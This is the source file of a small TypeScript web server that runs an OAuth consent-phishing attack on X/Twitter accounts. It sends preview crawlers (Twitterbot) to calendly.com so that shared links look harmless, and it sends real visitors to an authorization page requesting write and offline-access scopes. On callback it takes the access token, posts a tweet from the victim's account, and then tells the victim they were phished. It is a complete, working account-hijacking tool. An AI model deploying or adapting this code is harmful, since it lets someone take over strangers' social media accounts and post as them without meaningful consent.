import {serve} from '@hono/node-server'
import {Hono} from 'hono'
import dotenv from 'dotenv'
import crypto from 'crypto'

dotenv.config()

const app = new Hono()

const CLIENT_ID = process.env.CLIENT_ID
const REDIRECT_URL = process.env.REDIRECT_URL as string

function generateCodeVerifier() {
    return crypto.randomBytes(32).toString('base64url')
}

function generateCodeChallenge(verifier: string) {
    return crypto.createHash('sha256').update(verifier).digest('base64url')
}

const codeVerifiers = new Map<string, string>()

app.get('/', (c) => {
    if (c.req.header('user-agent') === 'Twitterbot/1.0') {
        return c.redirect('https://calendly.com')
    }
    const state = crypto.randomBytes(16).toString('hex')
    const codeVerifier = generateCodeVerifier()
    const codeChallenge = generateCodeChallenge(codeVerifier)
    codeVerifiers.set(state, codeVerifier)

    const authUrl = `https://x.com/i/oauth2/authorize?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URL)}&scope=users.read%20tweet.read%20tweet.write%20offline.access&state=${state}&code_challenge=${codeChallenge}&code_challenge_method=S256`
    return c.redirect(authUrl)
})

app.get('/callback', async (c) => {
    const code = c.req.query('code')
    const state = c.req.query('state')
    if (!code) {
        return c.text('Code not provided', 400)
    }
    if (!state || !codeVerifiers.has(state)) {
        return c.text('Invalid state parameter', 400)
    }
    const codeVerifier = codeVerifiers.get(state)
    codeVerifiers.delete(state)

    try {
        const formData = new URLSearchParams({
            code: code,
            grant_type: 'authorization_code',
            redirect_uri: REDIRECT_URL,
            client_id: CLIENT_ID as string,
            code_verifier: codeVerifier as string
        });

        // get token
        const tokenResponse = await fetch('https://api.x.com/2/oauth2/token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: formData.toString()
        });

        if (!tokenResponse.ok) {
            const errorData = await tokenResponse.text();
            throw new Error(`Error getting token: ${tokenResponse.status} ${errorData}`);
        }

        const tokenData = await tokenResponse.json();
        const accessToken = tokenData.access_token;

        const tweetResponse = await fetch('https://api.twitter.com/2/tweets', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${accessToken}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                text: 'hello 😀 !'
            })
        });

        if (!tweetResponse.ok) {
            const errorData = await tweetResponse.text();
            throw new Error(`Error while tweeting: ${tweetResponse.status} ${errorData}`);
        }

        const tweetData = await tweetResponse.json();
        return c.text(`You have been phished 🎣 look at your tweet: https://twitter.com/i/status/${tweetData.data.id}`, 200);
    } catch (error: any) {
        console.error('Error', error.message);
        return c.text(`Error ${error.message}`, 500);
    }
});

serve({
    fetch: app.fetch,
    port: 3000
}, (info) => {
    console.log(`Server is running on http://localhost:${info.port}`)
})
